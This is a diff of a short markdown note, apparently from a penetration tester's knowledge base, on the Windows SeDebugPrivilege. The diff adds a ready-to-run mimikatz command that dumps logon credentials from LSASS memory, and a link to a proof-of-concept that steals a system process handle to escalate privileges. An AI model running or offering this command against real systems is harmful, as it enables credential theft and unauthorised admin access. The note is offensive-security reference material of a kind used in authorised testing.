@@ -2,11 +2,15 @@
 title: SeDebugPrivilege
 ---
 
-A [[notes/windows/privilege]] that allows to access the memory of any process and therefore escalation to local admin, e.g. by [[notes/windows/lsass-dump|dumping LSASS]].
+A [[notes/windows/privilege]] that allows to access the memory of any process and therefore escalation to local admin.
 
-Untested tools:
+Either by [[notes/windows/lsass-dump|dumping LSASS]].
 
-- [SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/blob/main/PrivilegedOperations/SeDebugPrivilegePoC)
+~~~ bat
+.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+~~~
+
+Or by stealing a handle from a system process with [SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/blob/main/PrivilegedOperations/SeDebugPrivilegePoC).
 
 # GPO Bypass
 
